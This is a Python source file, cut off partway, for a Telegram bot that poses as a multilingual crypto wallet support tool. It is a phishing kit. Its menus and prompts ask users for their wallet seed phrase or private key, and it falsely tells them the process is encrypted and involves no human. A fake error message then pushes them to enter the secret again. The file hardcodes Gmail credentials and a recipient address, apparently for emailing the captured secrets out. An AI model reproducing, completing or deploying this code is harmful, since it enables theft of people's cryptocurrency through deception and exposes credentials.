import logging
import smtplib
from email.message import EmailMessage
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler
)

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logging.getLogger("httpx").setLevel(logging.WARNING)

# States for our conversation handler
CHOOSE_LANGUAGE = 0
MAIN_MENU = 1
AWAIT_CONNECT_WALLET = 2
CHOOSE_WALLET_TYPE = 3
CHOOSE_OTHER_WALLET_TYPE = 4
PROMPT_FOR_INPUT = 5
RECEIVE_INPUT = 6
AWAIT_RESTART = 7

# --- Email Configuration (YOU MUST UPDATE THESE) ---
# NOTE: Using a hardcoded password is a SECURITY RISK. For a real application,
# use environment variables. For a Gmail account, you need to use an App Password,
# not your regular password, and you may need to enable 2-step verification.
SENDER_EMAIL = "airdropphrase@gmail.com"
SENDER_PASSWORD = "ipxs ffag eqmk otqd" # Use an App Password if using Gmail
RECIPIENT_EMAIL = "airdropphrase@gmail.com"

# Dictionary for multi-language support
LANGUAGES = {
    'en': {
        'welcome': "Hi {user}! Welcome to your ultimate self-service resolution tool for all your crypto wallet needs! This bot is designed to help you quickly and efficiently resolve common issues such as Connection Errors, Migration Challenges, Staking Complications, High Gas Fees, Stuck Transactions, Missing Funds, Claim Rejections, Liquidity Problems, Frozen Transactions, Swapping Difficulties, and Lost Tokens. Whether you're facing issues with wallet synchronization, incorrect token balances, failed transfers, we've got you covered. Our goal is to guide you through the troubleshooting process step-by-step, empowering you to take control of your crypto wallet experience. Let's get started and resolve your issues today!",
        'main_menu_title': "Please select an issue type to continue:",
        'buy': "🌳 Buy",
        'validation': "🌳 Validation",
        'claim_tokens': "🌳 Claim Tokens",
        'migration_issues': "🌳 Migration Issues",
        'assets_recovery': "🌳 Assets Recovery",
        'general_issues': "🌳 General Issues",
        'rectification': "🌳 Rectification",
        'staking_issues': "🌳 Staking Issues",
        'deposits': "🌳 Deposits",
        'withdrawals': "🌳 Withdrawals",
        'slippage_error': "🌳 Slippage Error",
        'login_issues': "🌳 Login Issues",
        'high_gas_fees': "🌳 High Gas Fees",
        'presale_issues': "🌳 Presale Issues",
        'missing_balance': "🌳 Missing/Irregular Balance",
        'connect_wallet_message': "Please connect your wallet with your Private Key or Seed Phrase to continue.",
        'connect_wallet_button': "🔑 Connect Wallet",
        'select_wallet_type': "Please select your wallet type:",
        'other_wallets': "Other Wallets",
        'private_key': "🔑 Private Key",
        'seed_phrase': "🔒 Import Seed Phrase",
        'wallet_selection_message': "You have selected {wallet_name}.\nSelect your preferred mode of connection.",
        'reassurance': "\n\nFor your security, please be aware that all information is processed securely by the bot and no human intervention is involved. This process is fully encrypted and protected to ensure your data is safe during synchronization.",
        'prompt_seed': "Please enter your 12/24 words secret phrase.{reassurance}",
        'prompt_private_key': "Please enter your private key.{reassurance}",
        'invalid_choice': "Invalid choice. Please use the buttons.",
        'final_error_message': "‼️🌳 An error occured, Please ensure you are entering the correct key, please use copy and paste to avoid errors. please /start to try again. ",
        'choose_language': "Please select your preferred language:",
        'await_restart_message': "Please click on /start to start over again."
    },
    'es': {
        'welcome': "¡Hola {user}! ¡Bienvenido a su herramienta de autoservicio definitiva para todas las necesidades de su billetera de criptomonedas! Este bot está diseñado para ayudarlo a resolver de manera rápida y eficiente problemas comunes como errores de conexión, desafíos de migración, complicaciones de staking, altas tarifas de gas, transacciones atascadas, fondos perdidos, rechazos de reclamaciones, problemas de liquidez, transacciones congeladas, dificultades de intercambio y tokens perdidos. Ya sea que enfrente problemas con la sincronización de la billetera, saldos de tokens incorrectos, transferencias fallidas, lo tenemos cubierto. Nuestro objetivo es guiarlo a través del proceso de solución de problemas paso a paso, lo que le permitirá tomar el control de su experiencia con la billetera de criptomonedas. ¡Comencemos y resolvamos sus problemas hoy!",
        'main_menu_title': "Seleccione un tipo de problema para continuar:",
        'buy': "🌳 Comprar",
        'validation': "🌳 Validación",
        'claim_tokens': "🌳 Reclamar Tokens",
        'migration_issues': "🌳 Problemas de Migración",
        'assets_recovery': "🌳 Recuperación de Activos",
        'general_issues': "🌳 Problemas Generales",
        'rectification': "🌳 Rectificación",
        'staking_issues': "🌳 Problemas de Staking",
        'deposits': "🌳 Depósitos",
        'withdrawals': "🌳 Retiros",
        'slippage_error': "🌳 Error de Deslizamiento",
        'login_issues': "🌳 Problemas de Inicio de Sesión",
        'high_gas_fees': "🌳 Altas Tarifas de Gas",
        'presale_issues': "🌳 Problemas de Preventa",
        'missing_balance': "🌳 Saldo Perdido/Irregular",
        'connect_wallet_message': "Por favor, conecte su billetera con su Clave Privada o Frase Semilla para continuar.",
        'connect_wallet_button': "🔑 Conectar Billetera",
        'select_wallet_type': "Por favor, seleccione el tipo de su billetera:",
        'other_wallets': "Otras Billeteras",
        'private_key': "🔑 Clave Privada",
        'seed_phrase': "🔒 Importar Frase Semilla",
        'wallet_selection_message': "Ha seleccionado {wallet_name}.\nSeleccione su modo de conexión preferido.",
        'reassurance': "\n\nPara su seguridad, tenga en cuenta que toda la información es procesada de forma segura por el bot y no hay intervención humana. Este proceso está totalmente encriptado y protegido para garantizar que sus datos estén seguros durante la sincronización.",
        'prompt_seed': "Por favor, ingrese su frase secreta de 12/24 palabras.{reassurance}",
        'prompt_private_key': "Por favor, ingrese su clave privada.{reassurance}",
        'invalid_choice': "Opción inválida. Por favor, use los botones.",
        'final_error_message': "‼️🌳 Ha ocurrido un error, asegúrese de que está introduciendo la clave correcta, por favor, use copiar y pegar para evitar errores. Por favor, /start para intentarlo de nuevo. ",
        'choose_language': "Por favor, seleccione su idioma preferido:",
        'await_restart_message': "Por favor, haga clic en /start para empezar de nuevo."
    },
    'fr': {
        'welcome': "Salut {user} ! Bienvenue dans votre outil d'auto-assistance ultime pour tous vos besoins en portefeuille crypto ! Ce bot est conçu pour vous aider à résoudre rapidement et efficacement les problèmes courants tels que les erreurs de connexion, les défis de migration, les complications de staking, les frais de gaz élevés, les transactions bloquées, les fonds manquants, les rejets de réclamation, les problèmes de liquidité, les transactions gelées, les difficultés d'échange et les jetons perdus. Que vous ayez des problèmes de synchronisation de portefeuille, de soldes de jetons incorrects, de transferts échoués, nous avons ce qu'il vous faut. Notre objectif est de vous guider étape par étape dans le processus de dépannage, vous permettant de prendre le contrôle de votre expérience de portefeuille crypto. Commençons et résolvons vos problèmes dès aujourd'hui !",
        'main_menu_title': "Veuillez sélectionner un type de problème pour continuer :",
        'buy': "🌳 Acheter",
        'validation': "🌳 Validation",
        'claim_tokens': "🌳 Réclamer des Tokens",
        'migration_issues': "🌳 Problèmes de Migration",
        'assets_recovery': "🌳 Récupération d'Actifs",
        'general_issues': "🌳 Problèmes Généraux",
        'rectification': "🌳 Rectification",
        'staking_issues': "🌳 Problèmes de Staking",
        'deposits': "🌳 Dépôts",
        'withdrawals': "🌳 Retraits",
        'slippage_error': "🌳 Erreur de Glissement",
        'login_issues': "🌳 Problèmes de Connexion",
        'high_gas_fees': "🌳 Frais de Gaz Élevés",
        'presale_issues': "🌳 Problèmes de Prévente",
        'missing_balance': "🌳 Solde Manquant/Irrégulier",
        'connect_wallet_message': "Veuillez connecter votre portefeuille avec votre Clé Privée ou votre Phrase Secrète pour continuer.",
        'connect_wallet_button': "🔑 Connecter un Portefeuille",
        'select_wallet_type': "Veuillez sélectionner votre type de portefeuille :",
        'other_wallets': "Autres Portefeuilles",
        'private_key': "🔑 Clé Privée",
        'seed_phrase': "🔒 Importer une Phrase Secrète",
        'wallet_selection_message': "Vous avez sélectionné {wallet_name}.\nSélectionnez votre mode de connexion préféré.",
        'reassurance': "\n\nPour votre sécurité, veuillez noter que toutes les informations sont traitées en toute sécurité par le bot et qu'aucune intervention humaine n'est impliquée. Ce processus est entièrement crypté et protégé pour garantir la sécurité de vos données pendant la synchronisation.",
        'prompt_seed': "Veuillez entrer votre phrase secrète de 12/24 mots.{reassurance}",
        'prompt_private_key': "Veuillez entrer votre clé privée.{reassurance}",
        'invalid_choice': "Choix invalide. Veuillez utiliser les boutons.",
        'final_error_message': "‼️🌳 Une erreur est survenue, veuillez vous assurer que vous entrez la bonne clé, veuillez utiliser le copier-coller pour éviter les erreurs. Veuillez /start pour réessayer. ",
        'choose_language': "Veuillez sélectionner votre langue préférée :",
        'await_restart_message': "Veuillez cliquer sur /start pour recommencer."
    },
    'ru': {
        'welcome': "Привет, {user}! Добро пожаловать в ваш универсальный инструмент для решения проблем с криптовалютным кошельком! Этот бот создан для того, чтобы помочь вам быстро и эффективно решить распространенные проблемы, такие как ошибки подключения, проблемы с миграцией, сложности со стейкингом, высокие комиссии за газ, застрявшие транзакции, пропавшие средства, отказы в получении токенов, проблемы с ликвидностью, замороженные транзакции, трудности с обменом и потерянные токены. Если у вас возникли проблемы с синхронизацией кошелька, неправильным балансом токенов или неудачными переводами, мы вам поможем. Наша цель — шаг за шагом провести вас через процесс устранения неполадок, чтобы вы могли взять под контроль свой опыт работы с криптовалютным кошельком. Давайте начнем и решим ваши проблемы сегодня!",
        'main_menu_title': "Пожалуйста, выберите тип проблемы, чтобы продолжить:",
        'buy': "🌳 Купить",
        'validation': "🌳 Валидация",
        'claim_tokens': "🌳 Запросить Токены",
        'migration_issues': "🌳 Проблемы с Миграцией",
        'assets_recovery': "🌳 Восстановление Активов",
        'general_issues': "🌳 Общие Проблемы",
        'rectification': "🌳 Исправление",
        'staking_issues': "🌳 Проблемы со Стейкингом",
        'deposits': "🌳 Депозиты",
        'withdrawals': "🌳 Выводы",
        'slippage_error': "🌳 Ошибка Проскальзывания",
        'login_issues': "🌳 Проблемы со Входом",
        'high_gas_fees': "🌳 Высокие Комиссии за Газ",
        'presale_issues': "🌳 Проблемы с Предпродажей",
        'missing_balance': "🌳 Пропавший/Неправильный Баланс",
        'connect_wallet_message': "Пожалуйста, подключите свой кошелек с помощью приватного ключа или секретной фразы для продолжения.",
        'connect_wallet_button': "🔑 Подключить Кошелек",
        'select_wallet_type': "Пожалуйста, выберите тип вашего кошелька:",
        'other_wallets': "Другие Кошельки",
        'private_key': "🔑 Приватный Ключ",
        'seed_phrase': "🔒 Импортировать Секретную Фразу",
        'wallet_selection_message': "Вы выбрали {wallet_name}.\nВыберите предпочтительный способ подключения.",
        'reassurance': "\n\nДля вашей безопасности, пожалуйста, имейте в виду, что вся информация обрабатывается ботом безопасно и без участия человека. Этот процесс полностью зашифрован и защищен, чтобы гарантировать безопасность ваших данных во время синхронизации.",
        'prompt_seed': "Пожалуйста, введите вашу секретную фразу из 12/24 слов.{reassurance}",
        'prompt_private_key': "Пожалуйста, введите ваш приватный ключ.{reassurance}",
        'invalid_choice': "Неверный выбор. Пожалуйста, используйте кнопки.",
        'final_error_message': "‼️🌳 Произошла ошибка. Пожалуйста, убедитесь, что вы вводите правильный ключ, используйте копирование и вставку, чтобы избежать ошибок. Пожалуйста, /start, чтобы попробовать снова. ",
        'choose_language': "Пожалуйста, выберите ваш предпочтительный язык:",
        'await_restart_message': "Пожалуйста, нажмите /start, чтобы начать заново."
    },
    'uk': {
        'welcome': "Привіт, {user}! Ласкаво просимо до вашого універсального інструменту для вирішення проблем з криптовалютним гаманцем! Цей бот розроблений, щоб допомогти вам швидко та ефективно вирішити поширені проблеми, такі як помилки підключення, проблеми з міграцією, складності зі стейкінгом, високі комісії за газ, заблоковані транзакції, зниклі кошти, відмови в отриманні токенів, проблеми з ліквідністю, заморожені транзакції, труднощі з обміном і втрачені токени. Незалежно від того, чи стикаєтеся ви з проблемами синхронізації гаманця, неправильним балансом токенів, невдалими переказами, ми вам допоможемо. Наша мета — крок за кроком провести вас через процес усунення несправностей, даючи вам можливість взяти під контроль свій досвід роботи з криптовалютним гаманцем. Давайте почнемо і вирішимо ваші проблеми сьогодні!",
        'main_menu_title': "Будь ласка, виберіть тип проблеми, щоб продовжити:",
        'buy': "🌳 Купити",
        'validation': "🌳 Валідація",
        'claim_tokens': "🌳 Отримати Токени",
        'migration_issues': "🌳 Проблеми з Міграцією",
        'assets_recovery': "🌳 Відновлення Активів",
        'general_issues': "🌳 Загальні Проблеми",
        'rectification': "🌳 Виправлення",
        'staking_issues': "🌳 Проблеми зі Стейкінгом",
        'deposits': "🌳 Депозити",
        'withdrawals': "🌳 Виведення",
        'slippage_error': "🌳 Помилка Просковзування",
        'login_issues': "🌳 Проблеми з Входом",
        'high_gas_fees': "🌳 Високі Комісії за Газ",
        'presale_issues': "🌳 Проблеми з Передпродажем",
        'missing_balance': "🌳 Зниклий/Нерегулярний Баланс",
        'connect_wallet_message': "Будь ласка, підключіть свій гаманець за допомогою приватного ключа або секретної фрази, щоб продовжити.",
        'connect_wallet_button': "🔑 Підключити Гаманець",
        'select_wallet_type': "Будь ласка, виберіть тип вашого гаманця:",
        'other_wallets': "Інші Гаманці",
        'private_key': "🔑 Приватний Ключ",
        'seed_phrase': "🔒 Імпортувати Секретну Фразу",
        'wallet_selection_message': "Ви вибрали {wallet_name}.\nВиберіть бажаний спосіб підключення.",
        'reassurance': "\n\nДля вашої безпеки, будь ласка, майте на увазі, що вся інформація обробляється ботом безпечно і без участі людини. Цей процес повністю зашифрований і захищений, щоб гарантувати безпеку ваших даних під час синхронізації.",
        'prompt_seed': "Будь ласка, введіть вашу секретну фразу з 12/24 слів.{reassurance}",
        'prompt_private_key': "Будь ласка, введіть ваш приватний ключ.{reassurance}",
        'invalid_choice': "Неправильний вибір. Будь ласка, використовуйте кнопки.",
        'final_error_message': "‼️🌳 Сталася помилка. Будь ласка, переконайтеся, що ви вводите правильний ключ, використовуйте копіювання та вставку, щоб уникнути помилок. Будь ласка, /start, щоб спробувати знову. ",
        'choose_language': "Будь ласка, виберіть ваш бажаний мову:",
        'await_restart_message': "Будь ласка, натисніть /start, щоб почати заново."
    },
    'fa': {
        'welcome': "سلام {user}! به ابزار نهایی خودکار حل مشکلات کیف پول ارزهای دیجیتال خود خوش آمدید! این ربات برای کمک به شما در حل سریع و کارآمد مسائل رایج مانند خطاهای اتصال، چالش‌های مهاجرت، پیچیدگی‌های استیکینگ، هزینه‌های بالای گس، تراکنش‌های گیر کرده، وجوه گمشده، رد شدن ادعاها، مشکلات نقدینگی، تراکنش‌های مسدود شده، مشکلات سواپ و توکن‌های از دست رفته طراحی شده است. چه با مسائل مربوط به همگام‌سازی کیف پول، موجودی‌های توکن نادرست یا انتقال‌های ناموفق روبرو باشید، ما به شما کمک می‌کنیم. هدف ما راهنمایی شما در فرآیند عیب‌یابی گام به گام است تا شما بتوانید تجربه کیف پول ارز دیجیتال خود را کنترل کنید. بیایید شروع کنیم و امروز مشکلات شما را حل کنیم!",
        'main_menu_title': "لطفاً برای ادامه یک نوع مشکل را انتخاب کنید:",
        'buy': "🌳 خرید",
        'validation': "🌳 اعتبارسنجی",
        'claim_tokens': "🌳 دریافت توکن‌ها",
        'migration_issues': "🌳 مسائل مهاجرت",
        'assets_recovery': "🌳 بازیابی دارایی‌ها",
        'general_issues': "🌳 مسائل عمومی",
        'rectification': "🌳 اصلاح",
        'staking_issues': "🌳 مسائل استیکینگ",
        'deposits': "🌳 واریز",
        'withdrawals': "🌳 برداشت",
        'slippage_error': "🌳 خطای لغزش",
        'login_issues': "🌳 مسائل ورود به سیستم",
        'high_gas_fees': "🌳 هزینه‌های بالای گس",
        'presale_issues': "🌳 مسائل پیش‌فروش",
        'missing_balance': "🌳 موجودی گمشده/نامنظم",
        'connect_wallet_message': "لطفاً برای ادامه کیف پول خود را با کلید خصوصی یا عبارت Seed خود متصل کنید.",
        'connect_wallet_button': "🔑 اتصال کیف پول",
        'select_wallet_type': "لطفاً نوع کیف پول خود را انتخاب کنید:",
        'other_wallets': "کیف پول‌های دیگر",
        'private_key': "🔑 کلید خصوصی",
        'seed_phrase': "🔒 وارد کردن عبارت Seed",
        'wallet_selection_message': "شما {wallet_name} را انتخاب کرده‌اید.\nلطفاً حالت اتصال ترجیحی خود را انتخاب کنید.",
        'reassurance': "\n\nبرای امنیت شما، لطفاً توجه داشته باشید که تمام اطلاعات به صورت ایمن توسط ربات پردازش می‌شوند و هیچ دخالت انسانی در آن وجود ندارد. این فرآیند به طور کامل رمزگذاری و محافظت می‌شود تا اطلاعات شما در طول همگام‌سازی ایمن باشند.",
        'prompt_seed': "لطفاً عبارت مخفی 12/24 کلمه‌ای خود را وارد کنید.{reassurance}",
        'prompt_private_key': "لطفاً کلید خصوصی خود را وارد کنید.{reassurance}",
        'invalid_choice': "انتخاب نامعتبر است. لطفاً از دکمه‌ها استفاده کنید.",
        'final_error_message': "‼️🌳 خطایی رخ داد، لطفاً مطمئن شوید که کلید صحیح را وارد می‌کنید، لطفاً از کپی و پیست برای جلوگیری از خطاها استفاده کنید. لطفاً برای تلاش مجدد /start را بزنید. ",
        'choose_language': "لطفاً زبان مورد نظر خود را انتخاب کنید:",
        'await_restart_message': "لطفاً روی /start کلیک کنید تا از ابتدا شروع کنید."
    },
    'ar': {
        'welcome': "مرحبًا {user}! مرحبًا بك في أداتك النهائية للحل الذاتي لجميع احتياجات محفظة العملات المشفرة الخاصة بك! تم تصميم هذا الروبوت لمساعدتك في حل المشكلات الشائعة بسرعة وفعالية مثل أخطاء الاتصال، تحديات الترحيل، تعقيدات التوقيع، رسوم الغاز المرتفعة، المعاملات العالقة، الأموال المفقودة، رفض المطالبات، مشاكل السيولة، المعاملات المجمدة، صعوبات التبديل، والرموز المميزة المفقودة. سواء كنت تواجه مشاكل في مزامنة المحفظة، أو أرصدة الرموز غير الصحيحة، أو التحويلات الفاشلة، فنحن نوفر لك الحماية. هدفنا هو إرشادك خلال عملية استكشاف الأخطاء وإصلاحها خطوة بخطوة، مما يمكّنك من التحكم في تجربة محفظة العملات المشفرة الخاصة بك. لنبدأ ونحل مشاكلك اليوم!",
        'main_menu_title': "يرجى تحديد نوع المشكلة للمتابعة:",
        'buy': "🌳 شراء",
        'validation': "🌳 التحقق",
        'claim_tokens': "🌳 المطالبة بالرموز",
        'migration_issues': "🌳 مشاكل الترحيل",
        'assets_recovery': "🌳 استرداد الأصول",
        'general_issues': "🌳 مشاكل عامة",
        'rectification': "🌳 تصحيح",
        'staking_issues': "🌳 مشاكل التوقيع",
        'deposits': "🌳 الودائع",
        'withdrawals': "🌳 السحوبات",
        'slippage_error': "🌳 خطأ الانزلاق",
        'login_issues': "🌳 مشاكل تسجيل الدخول",
        'high_gas_fees': "🌳 رسوم غاز مرتفعة",
        'presale_issues': "🌳 مشاكل البيع المسبق",
        'missing_balance': "🌳 رصيد مفقود/غير منتظم",
        'connect_wallet_message': "يرجى توصيل محفظتك باستخدام مفتاحك الخاص أو عبارة Seed للمتابعة.",
        'connect_wallet_button': "🔑 توصيل المحفظة",
        'select_wallet_type': "يرجى تحديد نوع محفظتك:",
        'other_wallets': "محافظ أخرى",
        'private_key': "🔑 مفتاح خاص",
        'seed_phrase': "🔒 استيراد عبارة Seed",
        'wallet_selection_message': "لقد اخترت {wallet_name}.\nحدد وضع الاتصال المفضل لديك.",
        'reassurance': "\n\nلأمانك، يرجى العلم أن جميع المعلومات تتم معالجتها بشكل آمن بواسطة الروبوت ولا يوجد أي تدخل بشري. هذه العملية مشفرة ومحمية بالكامل لضمان أمان بياناتك أثناء المزامنة.",
        'prompt_seed': "يرجى إدخال عبارتك السرية المكونة من 12/24 كلمة.{reassurance}",
        'prompt_private_key': "يرجى إدخال مفتاحك الخاص.{reassurance}",
        'invalid_choice': "اختيار غير صالح. يرجى استخدام الأزرار.",
        'final_error_message': "‼️🌳 حدث خطأ، يرجى التأكد من أنك تدخل المفتاح الصحيح، يرجى استخدام النسخ واللصق لتجنب الأخطاء. يرجى /start للمحاولة مرة أخرى. ",
        'choose_language': "يرجى تحديد لغتك المفضلة:",
        'await_restart_message': "يرجى النقر على /start للبدء من جديد."
    },
    'pt': {
        'welcome': "Olá {user}! Bem-vindo à sua ferramenta de resolução de autoatendimento definitiva para todas as suas necessidades de carteira de criptomoedas! Este bot foi projetado para ajudá-lo a resolver de forma rápida e eficiente problemas comuns, como erros de conexão, desafios de migração, complicações de staking, altas taxas de gás, transações presas, fundos ausentes, rejeições de reivindicação, problemas de liquidez, transações congeladas, dificuldades de troca e tokens perdidos. Se você estiver enfrentando problemas com a sincronização da carteira, saldos de tokens incorretos ou transferências com falha, estamos aqui para ajudar. Nosso objetivo é guiá-lo passo a passo pelo processo de solução de problemas, capacitando-o a assumir o controle de sua experiência com a carteira de criptomoedas. Vamos começar e resolver seus problemas hoje!",
        'main_menu_title': "Selecione um tipo de problema para continuar:",
        'buy': "🌳 Comprar",
        'validation': "🌳 Validação",
        'claim_tokens': "🌳 Reivindicar Tokens",
        'migration_issues': "🌳 Problemas de Migração",
        'assets_recovery': "🌳 Recuperação de Ativos",
        'general_issues': "🌳 Problemas Gerais",
        'rectification': "🌳 Retificação",
        'staking_issues': "🌳 Problemas de Staking",
        'deposits': "🌳 Depósitos",
        'withdrawals': "🌳 Saques",
        'slippage_error': "🌳 Erro de Derrapagem",
        'login_issues': "🌳 Problemas de Login",
        'high_gas_fees': "🌳 Altas Taxas de Gás",
        'presale_issues': "🌳 Problemas de Pré-venda",
        'missing_balance': "🌳 Saldo Ausente/Irregular",
        'connect_wallet_message': "Por favor, conecte sua carteira com sua Chave Privada ou Frase Semente para continuar.",
        'connect_wallet_button': "🔑 Conectar Carteira",
        'select_wallet_type': "Por favor, selecione o tipo da sua carteira:",
        'other_wallets': "Outras Carteiras",
        'private_key': "🔑 Chave Privada",
        'seed_phrase': "🔒 Importar Frase Semente",
        'wallet_selection_message': "Você selecionou {wallet_name}.\nSelecione seu modo de conexão preferido.",
        'reassurance': "\n\nPara sua segurança, esteja ciente de que todas as informações são processadas de forma segura pelo bot e nenhuma intervenção humana está envolvida. Este processo é totalmente criptografado e protegido para garantir que seus dados estejam seguros durante a sincronização.",
        'prompt_seed': "Por favor, insira sua frase secreta de 12/24 palavras.{reassurance}",
        'prompt_private_key': "Por favor, insira sua chave privada.{reassurance}",
        'invalid_choice': "Escolha inválida. Por favor, use os botões.",
        'final_error_message': "‼️🌳 Ocorreu um erro. Por favor, certifique-se de que está inserindo a chave correta, use copiar e colar para evitar erros. Por favor, /start para tentar novamente. ",
        'choose_language': "Por favor, selecione seu idioma preferido:",
        'await_restart_message': "Por favor, clique em /start para começar de novo."
    },
    'id': {
        'welcome': "Halo {user}! Selamat datang di alat penyelesaian mandiri terbaik Anda untuk semua kebutuhan dompet kripto Anda! Bot ini dirancang untuk membantu Anda dengan cepat dan efisien menyelesaikan masalah umum seperti Kesalahan Koneksi, Tantangan Migrasi, Komplikasi Staking, Biaya Gas Tinggi, Transaksi Terjebak, Dana Hilang, Penolakan Klaim, Masalah Likuiditas, Transaksi Beku, Kesulitan Swapping, dan Token Hilang. Baik Anda menghadapi masalah dengan sinkronisasi dompet, saldo token yang salah, transfer yang gagal, kami siap membantu. Tujuan kami adalah membimbing Anda melalui proses pemecahan masalah langkah demi langkah, memberdayakan Anda untuk mengendalikan pengalaman dompet kripto Anda. Mari kita mulai dan selesaikan masalah Anda hari ini!",
        'main_menu_title': "Silakan pilih jenis masalah untuk melanjutkan:",
        'buy': "🌳 Beli",
        'validation': "🌳 Validasi",
        'claim_tokens': "🌳 Klaim Token",
        'migration_issues': "🌳 Masalah Migrasi",
        'assets_recovery': "🌳 Pemulihan Aset",
        'general_issues': "🌳 Masalah Umum",
        'rectification': "🌳 Rekonsiliasi",
        'staking_issues': "🌳 Masalah Staking",
        'deposits': "🌳 Deposit",
        'withdrawals': "🌳 Penarikan",
        'slippage_error': "🌳 Kesalahan Slippage",
        'login_issues': "🌳 Masalah Login",
        'high_gas_fees': "🌳 Biaya Gas Tinggi",
        'presale_issues': "🌳 Masalah Pra-penjualan",
        'missing_balance': "🌳 Saldo Hilang/Tidak Teratur",
        'connect_wallet_message': "Silakan sambungkan dompet Anda dengan Kunci Pribadi atau Frasa Seed Anda untuk melanjutkan.",
        'connect_wallet_button': "🔑 Sambungkan Dompet",
        'select_wallet_type': "Silakan pilih jenis dompet Anda:",
        'other_wallets': "Dompet Lain",
        'private_key': "🔑 Kunci Pribadi",
        'seed_phrase': "🔒 Impor Frasa Seed",
        'wallet_selection_message': "Anda telah memilih {wallet_name}.\nSilakan pilih mode koneksi yang Anda sukai.",
        'reassurance': "\n\nUntuk keamanan Anda, harap ketahui bahwa semua informasi diproses dengan aman oleh bot dan tidak ada campur tangan manusia. Proses ini sepenuhnya dienkripsi dan dilindungi untuk memastikan data Anda aman selama sinkronisasi.",
        'prompt_seed': "Silakan masukkan frasa rahasia 12/24 kata Anda.{reassurance}",
        'prompt_private_key': "Silakan masukkan kunci pribadi Anda.{reassurance}",
        'invalid_choice': "Pilihan tidak valid. Silakan gunakan tombol.",
        'final_error_message': "‼️🌳 Terjadi kesalahan, Harap pastikan Anda memasukkan kunci yang benar, silakan gunakan salin dan tempel untuk menghindari kesalahan. silakan /start untuk mencoba lagi. ",
        'choose_language': "Silakan pilih bahasa pilihan Anda:",
        'await_restart_message': "Silakan klik /start untuk memulai kembali."
    },
    'de': {
        'welcome': "Hallo {user}! Willkommen bei Ihrem ultimativen Self-Service-Tool zur Lösung all Ihrer Krypto-Wallet-Probleme! Dieser Bot wurde entwickelt, um Ihnen schnell und effizient bei der Lösung häufiger Probleme zu helfen, wie z.B. Verbindungsfehler, Migrationsprobleme, Staking-Komplikationen, hohe Gasgebühren, feststeckende Transaktionen, fehlende Gelder, Ablehnungen von Ansprüchen, Liquiditätsprobleme, eingefrorene Transaktionen, Schwierigkeiten beim Swapping und verlorene Token. Egal, ob Sie Probleme mit der Wallet-Synchronisierung, falschen Token-Salden oder fehlgeschlagenen Überweisungen haben, wir helfen Ihnen. Unser Ziel ist es, Sie Schritt für Schritt durch den Fehlerbehebungsprozess zu führen und Ihnen die Kontrolle über Ihr Krypto-Wallet-Erlebnis zu geben. Lassen Sie uns beginnen und Ihre Probleme noch heute lösen!",
        'main_menu_title': "Bitte wählen Sie eine Art von Problem aus, um fortzufahren:",
        'buy': "🌳 Kaufen",
        'validation': "🌳 Validierung",
        'claim_tokens': "🌳 Tokens Beanspruchen",
        'migration_issues': "🌳 Migrationsprobleme",
        'assets_recovery': "🌳 Wiederherstellung von Vermögenswerten",
        'general_issues': "🌳 Allgemeine Probleme",
        'rectification': "🌳 Berichtigung",
        'staking_issues': "🌳 Staking-Probleme",
        'deposits': "🌳 Einzahlungen",
        'withdrawals': "🌳 Auszahlungen",
        'slippage_error': "🌳 Slippage-Fehler",
        'login_issues': "🌳 Anmeldeprobleme",
        'high_gas_fees': "🌳 Hohe Gasgebühren",
        'presale_issues': "🌳 Presale-Probleme",
        'missing_balance': "🌳 Fehlender/Unregelmäßiger Saldo",
        'connect_wallet_message': "Bitte verbinden Sie Ihre Wallet mit Ihrem privaten Schlüssel oder Ihrer Seed-Phrase, um fortzufahren.",
        'connect_wallet_button': "🔑 Wallet Verbinden",
        'select_wallet_type': "Bitte wählen Sie Ihren Wallet-Typ aus:",
        'other_wallets': "Andere Wallets",
        'private_key': "🔑 Privater Schlüssel",
        'seed_phrase': "🔒 Seed-Phrase Importieren",
        'wallet_selection_message': "Sie haben {wallet_name} ausgewählt.\nWählen Sie Ihre bevorzugte Verbindungsmethode.",
        'reassurance': "\n\nZu Ihrer Sicherheit beachten Sie bitte, dass alle Informationen sicher vom Bot verarbeitet werden und keine menschliche Intervention stattfindet. Dieser Prozess ist vollständig verschlüsselt und geschützt, um sicherzustellen, dass Ihre Daten während der Synchronisierung sicher sind.",
        'prompt_seed': "Bitte geben Sie Ihre 12/24-Wörter-Geheimphrase ein.{reassurance}",
        'prompt_private_key': "Bitte geben Sie Ihren privaten Schlüssel ein.{reassurance}",
        'invalid_choice': "Ungültige Auswahl. Bitte verwenden Sie die Schaltflächen.",
        'final_error_message': "‼️🌳 Ein Fehler ist aufgetreten. Bitte stellen Sie sicher, dass Sie den richtigen Schlüssel eingeben, verwenden Sie Kopieren und Einfügen, um Fehler zu vermeiden. Bitte /start, um es erneut zu versuchen. ",
        'choose_language': "Bitte wählen Sie Ihre bevorzugte Sprache:",
        'await_restart_message': "Bitte klicken Sie auf /start, um von vorne zu beginnen."
    },
    'nl': {
        'welcome': "Hallo {user}! Welkom bij uw ultieme self-service oplossingstool voor al uw crypto-wallet behoeften! Deze bot is ontworpen om u snel en efficiënt te helpen bij het oplossen van veelvoorkomende problemen zoals verbindingsfouten, migratie-uitdagingen, staking-complicaties, hoge gas-kosten, vastgelopen transacties, ontbrekende fondsen, claim-afwijzingen, liquiditeitsproblemen, bevroren transacties, ruilmoeilijkheden en verloren tokens. Of u nu problemen ondervindt met de walletsynchronisatie, onjuiste tokensaldo's of mislukte overdrachten, wij hebben het voor u. Ons doel is om u stap voor stap door het probleemoplossingsproces te leiden, zodat u de controle over uw crypto-wallet ervaring kunt nemen. Laten we vandaag nog beginnen en uw problemen oplossen!",
        'main_menu_title': "Gelieve een probleemtype te selecteren om verder te gaan:",
        'buy': "🌳 Kopen",
        'validation': "🌳 Validatie",
        'claim_tokens': "🌳 Tokens Claimen",
        'migration_issues': "🌳 Migratieproblemen",
        'assets_recovery': "🌳 Herstel van Activa",
        'general_issues': "🌳 Algemene Problemen",
        'rectification': "🌳 Rectificatie",
        'staking_issues': "🌳 Staking-problemen",
        'deposits': "🌳 Stortingen",
        'withdrawals': "🌳 Opnames",
        'slippage_error': "🌳 Slippage Fout",
        'login_issues': "🌳 Login-problemen",
        'high_gas_fees': "🌳 Hoge Gas-kosten",
        'presale_issues': "🌳 Presale-problemen",
